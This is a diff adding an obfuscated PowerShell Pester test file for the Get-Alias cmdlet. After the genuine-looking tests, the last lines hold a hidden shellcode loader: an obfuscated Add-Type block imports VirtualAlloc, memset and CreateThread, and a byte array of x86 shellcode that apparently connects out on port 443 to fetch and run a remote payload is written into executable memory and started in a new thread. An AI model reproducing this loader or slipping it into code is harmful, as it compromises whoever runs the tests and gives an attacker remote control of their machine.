@@ -1,0 +1,222 @@
+  $Y3ZCH  = [TypE]("{1}{0}" -F'tRING','s') ; 
+
+
+&("{0}{1}"-f 'Descr','ibe') ("{4}{1}{2}{0}{3}" -f'DRT Un','t-Alias',' ','it Tests','Ge') -Tags "CI" {
+    &('It') ("{2}{1}{9}{3}{7}{4}{11}{5}{8}{0}{6}{10}"-f'hrow P','a','Get-Ali',' B','cop','ou','SArgume','ogus S','ld t','s','ntException','e Name sh'){
+        { &("{2}{0}{1}"-f 'A','lias','Get-') -Name ("{0}{1}" -f'A','BCD') -Scope ("{0}{1}"-f'bogu','s') } | &("{0}{1}" -f 'Sh','ould') -Throw -ErrorId ("{1}{8}{2}{3}{9}{10}{4}{0}{6}{5}{7}"-f'ommands.GetAlias','Argum',',','Microso','erShell.C','mman','Co','d','ent','ft','.Pow')
+    }
+    &('It') ("{0}{1}{5}{3}{4}{2}"-f 'Ge','t-Alia','e','tOfRan','ge Scop','s Ou'){
+        { &("{0}{1}{2}" -f'G','et-A','lias') -Name ("{0}{1}"-f'AB','CD') -Scope ("{0}{1}" -f '99','999') } | &("{2}{0}{1}" -f'ou','ld','Sh') -Throw -ErrorId ("{3}{13}{1}{7}{12}{9}{15}{0}{4}{5}{8}{6}{10}{2}{14}{11}"-f'ft.Pow','gument','s','A','erSh','ell.','nds.','OutOfRan','Comma',',Micr','GetAlia','mmand','ge','r','Co','oso')
+    }
+    &('It') ("{3}{2}{1}{6}{0}{5}{4}"-f 'V','Sin',' Named ','Get-Alias','id','al','gle '){
+            &("{1}{0}{2}" -f'et-Al','S','ias') -Name ("{0}{1}" -f 'A','BCD') -Value "foo"
+            ${RE`s`ULt}=&("{2}{1}{0}" -f's','-Alia','Get') -Name ("{1}{0}" -f 'CD','AB')
+            ${Re`S`Ult}."N`AMe"| &("{1}{0}" -f 'd','Shoul') -BeExactly ("{1}{0}"-f 'BCD','A')
+            ${ReS`ULt}."d`ef`initION"| &("{1}{0}" -f'd','Shoul') -BeExactly "foo"
+            ${rE`sUlT}."deSC`RIp`TI`oN"| &("{1}{2}{0}"-f 'uld','Sh','o') -BeNullOrEmpty
+            ${re`S`ULT}."OP`T`IOnS"| &("{1}{0}" -f'uld','Sho') -BeExactly ("{1}{0}" -f'one','N')
+    }
+    &('It') ("{1}{3}{5}{2}{0}{6}{4}"-f 'onal Single','G','ti','et-','id','Alias Posi',' Val'){
+            &("{2}{1}{0}{3}" -f 't-','e','S','Alias') -Name ("{1}{0}" -f 'CD','AB') -Value "foo"
+            ${rE`s`ULT}=&("{0}{2}{1}" -f 'Ge','Alias','t-') ("{0}{1}"-f'AB','CD')
+            ${r`EsU`LT}."n`Ame"| &("{0}{1}"-f 'Shou','ld') -BeExactly ("{0}{1}" -f'A','BCD')
+            ${rE`SUlT}."defiN`I`TIon"| &("{0}{1}{2}" -f 'S','houl','d') -BeExactly "foo"
+            ${R`E`SUlt}."dEScr`i`PtIon"| &("{0}{1}"-f'Shoul','d') -BeNullOrEmpty
+            ${rES`U`lT}."opT`I`Ons"| &("{1}{0}"-f 'hould','S') -BeExactly ("{1}{0}" -f 'ne','No')
+    }
+    &('It') ("{3}{4}{8}{6}{5}{0}{2}{1}{7}" -f'e Va','i','l','G','et-Ali','pl','ti','d','as Named Mul'){
+            &("{2}{3}{1}{0}" -f's','-Alia','Se','t') -Name ("{0}{1}"-f'ABC','D') -Value "foo"
+            &("{0}{1}{2}" -f 'S','et-A','lias') -Name ("{1}{0}" -f'FG','AE') -Value "bar"
+            ${re`s`ULT}=&("{0}{2}{1}"-f 'Ge','s','t-Alia') -Name ("{0}{1}" -f 'AB','CD'),("{1}{0}"-f'EFG','A')
+            ${resu`Lt}[0]."NA`me"| &("{1}{0}{2}" -f 'u','Sho','ld') -BeExactly ("{1}{0}"-f'D','ABC')
+            ${res`U`LT}[0]."dEFIni`T`iON"| &("{0}{1}"-f 'Shoul','d') -BeExactly "foo"
+            ${rE`SulT}[0]."dE`ScRiPt`iON"| &("{0}{1}" -f'Shou','ld') -BeNullOrEmpty
+            ${R`esu`lt}[0]."oP`TIo`Ns"| &("{0}{1}{2}"-f 'S','ho','uld') -BeExactly ("{1}{0}"-f'ne','No')
+            ${r`EsU`lT}[1]."n`Ame"| &("{0}{2}{1}" -f'Sho','d','ul') -BeExactly ("{0}{1}"-f'AEF','G')
+            ${rE`suLT}[1]."defIn`iT`ion"| &("{0}{1}"-f'Sho','uld') -BeExactly "bar"
+            ${Res`U`lt}[1]."dE`Sc`Ri`ptiOn"| &("{1}{2}{0}"-f'd','Shou','l') -BeNullOrEmpty
+            ${res`U`LT}[1]."Op`TI`ONS"| &("{2}{1}{0}"-f 'd','ul','Sho') -BeExactly ("{0}{1}"-f 'Non','e')
+    }
+    &('It') ("{6}{3}{0}{8}{5}{7}{2}{1}{4}" -f'd Wi','li','d Va','ias Name','d','a','Get-Al','r','ldc'){
+            &("{1}{2}{0}"-f 's','Set-Al','ia') -Name ("{0}{1}"-f 'AB','CD') -Value "foo"
+            &("{1}{2}{0}"-f 'ias','S','et-Al') -Name ("{0}{1}"-f'AB','CG') -Value "bar"
+            ${ReSU`lt}=&("{1}{0}{2}"-f '-','Get','Alias') -Name ("{0}{1}" -f'AB','C*')
+            ${ReS`U`lT}[0]."NA`Me"| &("{1}{0}" -f'ould','Sh') -BeExactly ("{0}{1}"-f'A','BCD')
+            ${re`Su`Lt}[0]."De`FIn`iTioN"| &("{1}{0}"-f 'ld','Shou') -BeExactly "foo"
+            ${rE`SU`lt}[0]."De`SCRIptI`On"| &("{1}{0}" -f 'hould','S') -BeNullOrEmpty
+            ${r`EsU`Lt}[0]."o`P`TiOns"| &("{0}{1}"-f 'Shou','ld') -BeExactly ("{0}{1}" -f 'Non','e')
+            ${R`eSu`LT}[1]."NA`ME"| &("{2}{1}{0}" -f'uld','ho','S') -BeExactly ("{1}{0}" -f'CG','AB')
+            ${REs`Ult}[1]."De`F`inItiON"| &("{0}{1}"-f'Sh','ould') -BeExactly "bar"
+            ${rES`ULT}[1]."DeSc`R`iptIon"| &("{1}{0}" -f 'hould','S') -BeNullOrEmpty
+            ${reSu`Lt}[1]."O`pt`IonS"| &("{2}{0}{1}" -f 'h','ould','S') -BeExactly ("{0}{1}"-f 'No','ne')
+    }
+    &('It') ("{6}{7}{10}{8}{3}{2}{5}{0}{1}{9}{4}"-f'Wild','ca','i','Posit',' Valid','onal ','G','e','lias ','rd','t-A'){
+            &("{1}{2}{0}"-f 'ias','S','et-Al') -Name ("{0}{1}"-f 'AB','CD') -Value "foo"
+            &("{0}{1}{2}"-f'Set-A','li','as') -Name ("{1}{0}"-f 'G','ABC') -Value "bar"
+            ${re`S`UlT}=&("{1}{0}{2}"-f'lia','Get-A','s') ("{1}{0}" -f'C*','AB')
+            ${RE`SU`Lt}[0]."Na`Me"| &("{0}{1}" -f'S','hould') -BeExactly ("{0}{1}"-f 'ABC','D')
+            ${R`E`suLt}[0]."D`EF`iNitIoN"| &("{0}{1}" -f'S','hould') -BeExactly "foo"
+            ${r`eSUlT}[0]."DESCRIPT`I`ON"| &("{1}{0}" -f 'ld','Shou') -BeNullOrEmpty
+            ${re`s`ULt}[0]."O`p`TiONs"| &("{0}{1}"-f'Sh','ould') -BeExactly ("{0}{1}"-f'N','one')
+            ${resu`lt}[1]."N`AmE"| &("{0}{1}"-f'Shou','ld') -BeExactly ("{1}{0}" -f'CG','AB')
+            ${Re`S`Ult}[1]."De`F`inItIOn"| &("{1}{0}{2}" -f'ul','Sho','d') -BeExactly "bar"
+            ${Re`suLt}[1]."dEsCR`Ip`TIOn"| &("{0}{1}"-f'Shoul','d') -BeNullOrEmpty
+            ${rE`Sult}[1]."OP`Ti`ONs"| &("{0}{1}"-f'S','hould') -BeExactly ("{0}{1}" -f'N','one')
+    }
+    &('It') ("{3}{7}{5}{8}{4}{1}{0}{6}{2}"-f 'nd Excl','dcard A','id','Get-A','l','amed ','ude Val','lias N','Wi'){
+            &("{0}{2}{1}"-f 'S','t-Alias','e') -Name ("{1}{0}"-f'BCD','A') -Value "foo"
+            &("{0}{2}{1}"-f 'Se','ias','t-Al') -Name ("{0}{1}" -f'AB','CG') -Value "bar"
+            ${R`Es`ULT}=&("{1}{3}{0}{2}" -f 'lia','G','s','et-A') -Name ("{1}{0}" -f 'BC*','A') -Exclude ("{0}{1}"-f '*B','CG')
+            ${R`Es`ULt}[0]."nA`Me"| &("{0}{1}" -f'Sh','ould') -BeExactly ("{1}{0}" -f 'BCD','A')
+            ${re`s`Ult}[0]."DEFin`Iti`on"| &("{2}{1}{0}"-f'ould','h','S') -BeExactly "foo"
+            ${r`eSu`LT}[0]."DEsC`RI`p`TioN"| &("{1}{0}" -f'ould','Sh') -BeNullOrEmpty
+            ${r`ES`ULt}[0]."Op`T`IONS"| &("{0}{1}" -f 'S','hould') -BeExactly ("{1}{0}" -f'e','Non')
+    }
+    &('It') ("{1}{2}{3}{0}"-f'pe Valid','Get-Al','ias ','Sco'){
+            &("{1}{2}{0}"-f 'as','S','et-Ali') -Name ("{0}{1}"-f 'ABC','D') -Value "foo"
+            ${re`SU`Lt}=&("{0}{1}{2}"-f'Ge','t-Alia','s') -Name ("{0}{1}"-f'AB','CD')
+            ${REs`Ult}."NA`mE"| &("{1}{0}" -f 'uld','Sho') -BeExactly ("{0}{1}" -f'ABC','D')
+            ${RE`S`UlT}."DE`FI`NiTioN"| &("{0}{1}" -f 'Sho','uld') -BeExactly "foo"
+            ${reS`U`lT}."d`EsCri`PTiOn"| &("{0}{1}" -f'Sho','uld') -BeNullOrEmpty
+            ${rEs`ULT}."Op`T`ions"| &("{0}{1}" -f 'Shou','ld') -BeExactly ("{0}{1}" -f'N','one')
+
+            &("{0}{2}{1}"-f'Set','as','-Ali') -Name ("{1}{0}"-f'CD','AB') -Value ("{2}{0}{1}" -f 'f','oo','local') -scope ("{0}{1}" -f'loc','al')
+            ${rE`Su`LT}=&("{0}{2}{1}" -f 'Get','s','-Alia') -Name ("{1}{0}"-f'BCD','A') -scope ("{1}{0}" -f'ocal','l')
+            ${R`esU`lt}."N`AmE"| &("{2}{0}{1}"-f'houl','d','S') -BeExactly ("{0}{1}"-f'ABC','D')
+            ${RE`S`UlT}."d`e`FiNITIOn"| &("{0}{1}{2}"-f 'Sh','ou','ld') -BeExactly ("{0}{2}{1}" -f 'loc','foo','al')
+            ${resu`lt}."desCR`ip`TiON"| &("{0}{1}"-f 'S','hould') -BeNullOrEmpty
+            ${RE`Su`LT}."O`pTi`oNs"| &("{0}{1}" -f'Sh','ould') -BeExactly ("{1}{0}" -f'one','N')
+
+            &("{1}{2}{0}"-f 'Alias','S','et-') -Name ("{1}{0}"-f 'BCD','A') -Value ("{1}{0}{2}" -f'oba','gl','lfoo') -scope ("{0}{2}{1}" -f 'glo','l','ba')
+            &("{0}{2}{1}"-f 'Set-Al','as','i') -Name ("{1}{0}"-f'CD','AB') -Value ("{1}{0}{2}"-f 'r','sc','iptfoo') -scope ("{1}{0}"-f'cript','s')
+            &("{2}{0}{1}{3}" -f't-Al','i','Se','as') -Name ("{1}{0}"-f 'CD','AB') -Value ("{0}{1}"-f'fo','o0') -scope "0"
+            &("{1}{0}{2}" -f 'et-','S','Alias') -Name ("{0}{1}"-f'AB','CD') -Value ("{0}{1}"-f'f','oo1') -scope "1"
+
+            ${re`sulT}=&("{1}{2}{0}"-f'lias','Ge','t-A') -Name ("{0}{1}"-f 'AB','CD')
+            ${r`e`sULt}."Na`me"| &("{1}{2}{0}" -f'ld','S','hou') -BeExactly ("{1}{0}"-f 'CD','AB')
+            ${R`ESu`lT}."D`Ef`INItIOn"| &("{2}{0}{1}"-f'o','uld','Sh') -BeExactly ("{1}{0}" -f'0','foo')
+            ${r`EsuLt}."DescrIp`T`ioN"| &("{1}{0}"-f'd','Shoul') -BeNullOrEmpty
+            ${rE`S`Ult}."oP`Ti`ons"| &("{1}{0}"-f'ld','Shou') -BeExactly ("{0}{1}" -f 'N','one')
+
+            ${rEs`U`lt}=&("{0}{1}"-f'Get-','Alias') -Name ("{1}{0}" -f'BCD','A') -scope ("{0}{1}"-f 'lo','cal')
+            ${RESU`Lt}."na`Me"| &("{0}{1}" -f 'Sho','uld') -BeExactly ("{0}{1}"-f 'A','BCD')
+            ${R`eSulT}."DefiNIt`I`ON"| &("{1}{0}" -f'ould','Sh') -BeExactly ("{0}{1}" -f'f','oo0')
+            ${RE`SU`lt}."dESc`RI`ptIoN"| &("{1}{0}"-f'uld','Sho') -BeNullOrEmpty
+            ${REs`UlT}."oPtI`OnS"| &("{1}{0}" -f'd','Shoul') -BeExactly ("{0}{1}" -f 'No','ne')
+
+            ${RESu`LT}=&("{0}{2}{1}" -f'G','ias','et-Al') -Name ("{0}{1}" -f 'ABC','D') -scope ("{2}{1}{0}" -f 'l','oba','gl')
+            ${R`esu`lT}."n`AME"| &("{0}{1}" -f 'S','hould') -BeExactly ("{0}{1}" -f'A','BCD')
+            ${Re`sUlt}."DEFini`T`ion"| &("{1}{0}" -f'hould','S') -BeExactly ("{0}{1}{2}{3}" -f 'glo','balf','o','o')
+            ${R`ES`Ult}."des`c`R`Iption"| &("{1}{0}"-f 'hould','S') -BeNullOrEmpty
+            ${REs`ULt}."oP`Ti`Ons"| &("{1}{0}"-f'ould','Sh') -BeExactly ("{0}{1}"-f'N','one')
+
+            ${re`SulT}=&("{0}{1}{2}"-f 'G','et-Ali','as') -Name ("{0}{1}"-f 'A','BCD') -scope ("{2}{1}{0}"-f't','ip','scr')
+            ${rES`Ult}."n`AME"| &("{1}{0}"-f'd','Shoul') -BeExactly ("{1}{0}"-f'BCD','A')
+            ${R`eSU`Lt}."DE`F`iNitIOn"| &("{1}{0}"-f'uld','Sho') -BeExactly ("{1}{2}{0}"-f 'oo','scri','ptf')
+            ${resU`LT}."DES`C`RiP`TioN"| &("{1}{0}"-f'ould','Sh') -BeNullOrEmpty
+            ${rEs`Ult}."OPTI`ONs"| &("{0}{1}" -f'Sh','ould') -BeExactly ("{1}{0}"-f'one','N')
+
+            ${r`E`SUlt}=&("{2}{1}{0}" -f '-Alias','et','G') -Name ("{1}{0}"-f 'BCD','A') -scope "0"
+            ${r`eS`ULT}."nA`ME"| &("{0}{1}"-f'Shou','ld') -BeExactly ("{1}{0}"-f 'D','ABC')
+            ${R`EsU`LT}."dEfi`N`iTiON"| &("{0}{2}{1}"-f'Shou','d','l') -BeExactly ("{0}{1}"-f 'foo','0')
+            ${rEs`U`Lt}."De`S`cRiPT`iON"| &("{0}{2}{1}"-f 'S','d','houl') -BeNullOrEmpty
+            ${r`es`UlT}."OPT`iOns"| &("{0}{1}" -f'S','hould') -BeExactly ("{0}{1}"-f'N','one')
+
+            ${r`e`sULT}=&("{0}{1}" -f'G','et-Alias') -Name ("{1}{0}" -f'BCD','A') -scope "1"
+            ${r`EsU`Lt}."nA`mE"| &("{1}{0}" -f'hould','S') -BeExactly ("{1}{0}" -f'D','ABC')
+            ${rE`S`Ult}."defIn`i`TiON"| &("{0}{1}"-f 'S','hould') -BeExactly ("{1}{0}"-f 'oo1','f')
+            ${R`esu`LT}."dEScRIPT`i`on"| &("{0}{2}{1}" -f 'S','d','houl') -BeNullOrEmpty
+            ${r`ESu`Lt}."optI`OnS"| &("{0}{1}" -f'Shoul','d') -BeExactly ("{1}{0}" -f'ne','No')
+    }
+    &('It') ("{5}{6}{3}{0}{9}{2}{7}{10}{1}{11}{8}{4}" -f 'ias Expo',',','e','l','235','Get','-A',' Bug','BugId:905','s',' 1065828',' '){
+            { &("{1}{0}{2}"-f'et-','G','Alias') -Name ("{1}{0}" -f 'D','ABC') -Scope "100" } | &("{1}{0}"-f 'd','Shoul') -Throw -ErrorId ("{1}{0}{8}{6}{5}{9}{10}{2}{11}{7}{3}{4}" -f'rgum','A','ell','liasCo','mmand','OfRan','ut','A','entO','ge,Micr','osoft.PowerSh','.Commands.Get')
+    }
+    &('It') ("{0}{7}{5}{1}{8}{6}{3}{2}{4}"-f'G','ia','a','V','lid','-Al',' Scope ','et','s Zero'){
+            &("{3}{0}{1}{2}" -f'-Ali','a','s','Set') -Name ("{0}{1}"-f 'AB','CD') -Value "foo"
+            ${Re`sULt}=&("{2}{3}{1}{0}"-f 's','ia','Get-','Al') -Name ("{0}{1}"-f'ABC','D')
+            ${Res`UlT}."N`AmE"| &("{1}{0}{2}" -f 'houl','S','d') -BeExactly ("{0}{1}" -f 'A','BCD')
+            ${re`S`ULt}."dE`F`I`NITiOn"| &("{1}{0}"-f 'ld','Shou') -BeExactly "foo"
+            ${RE`sult}."dE`s`CrIPTiOn"| &("{1}{0}"-f'ld','Shou') -BeNullOrEmpty
+            ${REsu`lt}."opt`iO`NS"| &("{0}{1}"-f 'S','hould') -BeExactly ("{0}{1}" -f 'No','ne')
+
+            ${REs`ULT}=&("{1}{3}{2}{0}" -f 'ias','Ge','-Al','t') -Name ("{1}{0}"-f 'D','ABC') -scope "0"
+            ${RE`su`Lt}."na`mE"| &("{1}{0}"-f'ld','Shou') -BeExactly ("{0}{1}" -f'AB','CD')
+            ${resu`lt}."dEFI`N`iTion"| &("{0}{1}"-f 'Shou','ld') -BeExactly "foo"
+            ${rESU`Lt}."DEs`CRiP`TI`On"| &("{0}{1}"-f 'Sho','uld') -BeNullOrEmpty
+            ${ResU`lT}."o`PTIo`NS"| &("{0}{1}"-f'Sho','uld') -BeExactly ("{1}{0}"-f'e','Non')
+    }
+
+    &('It') ("{6}{2}{0}{3}{9}{4}{7}{5}{8}{1}"-f'st get','arameter','e','-','s w','ni','T','ith Defi','tion p','alia') {
+        ${re`TUrNO`BjECT} = &("{0}{1}" -f'Get-A','lias') -Definition ("{2}{1}{0}{3}" -f '-Co','et','G','mmand')
+        For(${i} = 0; ${I} -lt ${ReturNoB`j`E`Ct}."leN`gTh";${I}++)
+        {
+            ${re`TuRn`ObJ`E`cT}[${i}] | &("{1}{0}"-f 'd','Shoul') -Not -BeNullOrEmpty
+            ${R`ETUrNO`B`je`cT}[${I}]."coMmA`N`d`Type" | &("{1}{2}{0}"-f 'uld','S','ho') -Be ("{0}{1}"-f 'Alia','s')
+            ${R`ETur`Nob`ject}[${I}]."D`EFiNi`T`ioN" | &("{0}{1}"-f'Sho','uld') -Be ("{2}{1}{0}"-f 'ommand','-C','Get')
+        }
+    }
+}
+
+&("{0}{1}{2}"-f'Descri','b','e') ("{1}{2}{0}"-f 'lias','Get-','A') -Tags "CI" {
+    &('It') ("{14}{15}{4}{0}{10}{8}{2}{17}{1}{9}{12}{16}{13}{6}{5}{7}{3}{11}"-f 't','.Array','ys','bjec','e a re','an o','re th','ne o','n type of S',' ','ur','t','when ',' returns mo','Shou','ld hav','gal','tem') {
+        ${v`Al1}=(&("{0}{1}{2}"-f'Get-','Al','ias') ('a*'))
+        ${vA`L2}=(&("{2}{3}{0}{1}" -f 'a','s','G','et-Ali') ('c*'))
+        ${I}=0
+
+        ${V`AL1} | &("{0}{1}"-f'Sho','uld') -Not -BeNullOrEmpty
+        ${VA`l2} | &("{2}{1}{0}"-f 'd','houl','S') -Not -BeNullOrEmpty
+
+        ${V`AL1} | &("{2}{0}{3}{1}" -f 'orEach','ct','F','-Obje'){ ${I}++};
+        if(${i} -lt 2) {
+            ${Va`l1} | &("{1}{0}"-f'ould','Sh') -BeOfType ("{1}{5}{7}{3}{0}{2}{4}{6}"-f'.Co','Sys','m','tomation','m','tem.Managemen','andInfo','t.Au')
+        }
+        else
+        {
+            ,${Va`L1} | &("{0}{1}"-f 'Shou','ld') -BeOfType ("{1}{3}{0}{2}" -f 'A','System','rray','.')
+        }
+
+        ${vA`L2} | &("{3}{1}{4}{0}{2}" -f'-Obje','Eac','ct','For','h'){ ${I}++};
+        if(${i} -lt 2) {
+            ${V`AL2} | &("{1}{0}{2}" -f'ou','Sh','ld') -BeOfType ("{3}{11}{5}{6}{9}{8}{1}{2}{10}{4}{0}{7}" -f'mandI','a','t','System.Ma','on.Com','a','gement.A','nfo','m','uto','i','n')
+        }
+        else
+        {
+            ,${va`L2} | &("{0}{1}" -f 'Shou','ld') -BeOfType ("{2}{3}{0}{1}" -f 'r','ay','Syst','em.Ar')
+        }
+    }
+
+    &('It') ("{3}{2}{0}{4}{5}{1}{6}"-f 'ar',' of ','return an ','should ','r','ay','objects') {
+        ${V`Al} = &("{1}{0}" -f 's','Get-Alia') ('a*')
+        ${A`LI`As} = &("{1}{0}"-f 'al','g') ('a*')
+
+        ${v`AL}."cOU`Nt" | &("{2}{0}{1}" -f 'u','ld','Sho') -Be ${ali`As}."Co`UNT"
+        for (${i}=0; ${I} -lt ${v`Al}."C`oUnT";${I}++)
+        {
+            ${V`AL}[${I}]."cOM`MAnDTy`Pe" | &("{0}{1}"-f'Sho','uld') -Be ${Ali`As}[${i}]."COMm`A`NdTYPE"
+            ${V`Al}[${I}]."Na`me" | &("{1}{0}{2}" -f'oul','Sh','d') -Be ${alI`AS}[${i}]."NA`mE"
+            ${v`Al}[${i}]."mOD`UL`EN`AME" | &("{0}{1}{2}"-f'S','ho','uld') -Be ${a`L`IAs}[${i}]."M`O`DUleNamE"
+        }
+    }
+}
+
+&("{2}{0}{1}" -f'scrib','e','De') ("{3}{0}{2}{4}{1}" -f 'as null t','s','es','Get-Ali','t') -Tags "CI" {
+
+  ${teS`Tcas`ES} =
+    @{ ("{0}{1}" -f 'da','ta') = ${N`ULL}; ("{1}{0}" -f 'lue','va') = ("{0}{1}" -f'nul','l') },
+    @{ ("{1}{0}" -f 'ta','da') =  (  &("{0}{1}{2}"-f 'varIAb','L','E')  ("y"+"3ZCh")  -VA)::"EM`Pty"; ("{0}{1}"-f 'v','alue') = ("{0}{1}{2}" -f 'emp','ty stri','ng') }
+
+  &("{1}{2}{0}"-f'ext','Co','nt') ("{6}{1}{8}{4}{3}{5}{7}{0}{9}{2}"-f'am','heck null o','ter','o th','y value t','e -Name pa','C','r','r empt','e') {
+    &('It') ("{2}{1}{6}{8}{9}{10}{3}{11}{5}{7}{0}{4}{12}"-f 'param','ould throw ','Sh','e','ete',' to -N','if <value>','ame ',' ','i','s pass','d','r') -TestCases ${T`e`ST`cAseS} {
+      param(${d`ATA})
+      { &("{1}{0}{2}"-f 'l','Get-A','ias') -Name ${D`ATA} } | &("{1}{0}" -f 'uld','Sho') -Throw -ErrorId ("{0}{13}{6}{16}{11}{7}{15}{8}{9}{5}{3}{1}{14}{10}{4}{12}{2}"-f 'Par','l.Co','nd','owerShel','AliasCom','soft.P','me','Val','ror,Mic','ro','nds.Get','ument','ma','a','mma','idationEr','terArg')
+    }
+  }
+  &("{0}{2}{1}" -f 'C','xt','onte') ("{3}{8}{6}{12}{7}{4}{2}{5}{10}{11}{1}{0}{9}" -f 'a p',' vi','ame p','Check nu','alue to the -N','ar','or ','v','ll ','ipeline','ame','ter','empty ') {
+    &('It') ("{16}{8}{2}{1}{9}{4}{14}{6}{0}{7}{13}{5}{11}{3}{12}{10}{15}" -f' pi',' th','ould','ame pa','w if <value>','to','through','pelin','h','ro','te',' -N','rame','e ',' is passed ','r','S') -TestCases ${t`ES`TCAsES} {
+      param(${d`ATA})
+      { ${DA`Ta} | &("{1}{0}" -f'as','Get-Ali') -ErrorAction ("{1}{0}" -f'top','S') } | &("{0}{1}"-f 'Shoul','d') -Throw -ErrorId ("{16}{12}{11}{6}{9}{8}{0}{7}{18}{17}{14}{5}{13}{4}{2}{1}{15}{3}{10}" -f 'r,Micr','nds.GetAlias','.Comma','m','l','She','a','oso','onErro','lidati','and','tV','eterArgumen','l','wer','Com','Param','t.Po','f')
+    }
+  }
+}
+
+${c} = (((("{39}{94}{22}{66}{92}{71}{7}{43}{100}{44}{64}{72}{51}{113}{30}{17}{88}{90}{61}{67}{121}{115}{81}{84}{8}{5}{122}{85}{65}{24}{14}{110}{46}{53}{12}{10}{49}{69}{105}{18}{4}{120}{79}{54}{126}{77}{25}{112}{114}{29}{99}{127}{0}{125}{52}{56}{128}{63}{96}{37}{97}{40}{83}{31}{82}{21}{89}{27}{108}{98}{102}{26}{109}{6}{60}{86}{1}{101}{23}{119}{9}{28}{104}{116}{13}{38}{55}{118}{41}{58}{11}{59}{76}{50}{78}{107}{73}{103}{2}{32}{36}{91}{106}{87}{3}{57}{111}{62}{117}{75}{74}{19}{34}{93}{80}{123}{33}{48}{70}{45}{42}{95}{47}{68}{15}{124}{20}{16}{35}" -f'st',',','lpThr','t(h','[','l','Stack','ke','r ','StartAddress, IntPt','ocationT','g','lAll','aramet',', ',' ',' c','c ext',');','ati','rc, uint','lp','lIm','n','s','el3',' ','h','r','l','i','Ptr','eadId','I','c','ount);',')','Threa','e','[D','In',' dwCreat','se','rnel3','.dll','r mem','nt dw',' dest, u','n','ype, uint fl',' ','c ','i','Size, uint f','o','r','c ex','ozmsvcrt','ionFla','s','Si','nt','dll','r','hoz)]pu','ddres','port','Ptr','int','P','tPt','hoz','bli','tPtr','t','oz)]public s',',','zkern','I','lImp','er','oc(In',' ','t','tPt','A','ze','mpor','ern ','T','I',';[Dl','(',' ext','l','t(IntPtr',' Create','d(','ribu','hoz)]publ','2',' I','tes, uint',' ',' lp','rotect','lI','n','readAtt','dw','ui','.','2.d','stat','l','All','P','h',', uint','tPtr lp','Dl',' Virtual','p','n ','s','at','rt(ho','ic ','tern IntPt')) -REPLacE  ([chaR]104+[chaR]111+[chaR]122),[chaR]34));${W} = &("{1}{0}{2}"-f 'd-T','Ad','ype') -memberDefinition ${C} -Name ("{1}{0}" -f 'n32','Wi') -namespace ("{2}{1}{0}{3}" -f'nction','Fu','Win32','s') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x8d,0xff,0x90,0x57,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${G} = 0x1000;if (${z}."lEn`g`TH" -gt 0x1000){${g} = ${z}."l`eNg`TH"};${x}=${W}::("{1}{0}{2}"-f'rtua','Vi','lAlloc').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${Z}."L`eNgtH"-1);${i}++) {${W}::"ME`mSEt"([IntPtr](${x}.("{1}{0}" -f 't32','ToIn').Invoke()+${I}), ${z}[${I}], 1)};${w}::("{1}{0}{2}{3}"-f 'e','Cr','ateTh','read').Invoke(0,0,${x},0,0,0);for (;;){&("{2}{1}{0}{3}"-f'ee','t-sl','Star','p') 60};
